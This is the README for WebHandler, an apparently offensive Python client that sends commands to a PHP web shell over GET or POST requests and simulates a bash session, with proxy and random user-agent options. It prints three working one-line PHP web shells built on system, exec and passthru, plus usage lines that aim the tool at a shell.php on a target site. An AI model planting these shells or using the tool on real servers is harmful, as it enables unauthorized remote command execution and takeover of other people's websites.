WebHandler - Command controller for PHP system functions
---
![My image](http://s12.postimage.org/t5ujo2om5/Untitled_1.png)

### Info: ###
---
WebHandler is a command controller to handle PHP _program execution functions_ like system, passthru, exec and etc...
The script tries to simulate Linux bash as it works from CLI.
As of optional settings it supports HTTP proxy together with HTTP header values "User-Agent".
It sends requests to the server through urllib/urllib2 [Python][] modules.

* WebHandler works for **POST** and **GET** requests:
    - `<?php system($_GET['cmd']); ?>`
    - `<?php exec($_POST['cmd']); ?>`
    - `<?php passthru($_REQUEST['cmd']); ?>`

### Usage: ###
---
* --url is a positional argument withing GET and POST requests:
    - python webhandler.py --url http://www.mywebsite.com/shell.php?cmd=
    - python webhandler.py --url http://www.mywebsite.com/shell.php --method POST --parameter cmd
    - python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --random-agent --turbo
    - python webhandler.py -u http://www.mywebsite.com/shell.php?cmd= --proxy http://127.0.0.1:8080


__Requirements__
---
If your [Python][]'s version < 2.7.x, then [argparse][] **is required**.
To install it run: `sudo apt-get install python-setuptools && sudo easy_install argparse` **OR** `sudo pip --install argparse`

[readline][] **is optional**.
This module it used to provide elaborate line editing and history features

[git][] **is optional**.
This allows for the project to be kept up-to-date

[Python]: http://www.python.org/download/
[argparse]: http://docs.python.org/library/argparse.html
[readline]: http://cnswww.cns.cwru.edu/php/chet/readline/rltop.html
[git]: http://git-scm.com
